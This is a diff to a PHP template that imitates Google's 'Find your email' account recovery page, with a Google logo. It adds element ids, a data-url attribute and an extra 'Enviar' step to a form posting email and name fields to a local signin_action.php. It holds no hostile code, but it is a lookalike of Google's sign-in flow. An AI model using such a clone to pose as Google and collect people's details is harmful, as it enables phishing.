@@ -5,21 +5,21 @@ $title="Fazer Conta nas Contas Google";
 <?php require 'partials/header-login.php';?>
 <?php require 'partials/header-login.php';?>
 <form method="POST" action="<?=$base;?>/signin_action.php">
-    <div class="group-align">
+    <div class="group-align" data-url = "<?=$base;?>">
         <div class="group-title">
             <img src="assets/images/pngwing.com.png" alt="logo google">
             <h2>Find your email</h2>
             <p>Enter your recovery phone number or email</p>
         </div>
-        <div class="group-i"  style="display: none;">
+        <div class="group-i" id="recover-email">
             <div class="containeri-x">
                 <div class="fieldset-row-2">
                     <div class="align-i">
-                        <fieldset >
+                        <fieldset id="error-11">
                             <legend>Email or phone</legend>
-                            <input type="email"  name="email">
+                            <input id="11" type="email"  name="recover-email">
                         </fieldset>
-                        <span >Obrigatório</span>
+                        <span id="msg-11">Obrigatório</span>
                     </div>
                 </div>
                 <div class="link"></div>
@@ -27,30 +27,30 @@ $title="Fazer Conta nas Contas Google";
                 <div class="group-row">
                     <div class="col-acess-2"></div>
                     <div class="col-acess-2 align-i">
-                        <button  type="button">Next</button>
+                        <button id="recover-button-email" type="button">Next</button>
                     </div>
                 </div>
             </div>
         </div>
-        <div class="group-i" >
+        <div class="group-i name-i-x" id="recover-name">
             <div class="containeri-x">
                 <div class="fieldset-row-2">
                     <div class="align-i">
-                        <fieldset >
+                        <fieldset id="error-12">
                             <legend>First name</legend>
-                            <input type="email"  name="first-name-user">
+                            <input type="email"id="12"  name="first-name-user">
                         </fieldset>
-                        <span >Obrigatório</span>
+                        <span id="msg-12">Obrigatório</span>
                     </div>
                 </div>
 
                 <div class="fieldset-row-2">
                     <div class="align-i">
-                        <fieldset >
+                        <fieldset id="error-13">
                             <legend>last name</legend>
-                            <input type="text" name="last-name-user">
+                            <input type="text" id="13" name="last-name-user">
                         </fieldset>
-                        <span>Obrigatório</span>
+                        <span id="msg-13">Obrigatório</span>
                     </div>
                 </div>
                 <div class="link"></div>
@@ -58,7 +58,19 @@ $title="Fazer Conta nas Contas Google";
                 <div class="group-row">
                     <div class="col-acess-2"></div>
                     <div class="col-acess-2 align-i">
-                        <button type="button">Next</button>
+                        <button id="recover-button-name" type="button">Next</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="group-i env-email-x" id="env-email">
+            <div class="containeri-x">
+                <div class="link"></div>
+                <div class="access-i"></div>
+                <div class="group-row">
+                    <div class="col-acess-2"></div>
+                    <div class="col-acess-2 align-i">
+                        <button type="button">Enviar</button>
                     </div>
                 </div>
             </div>
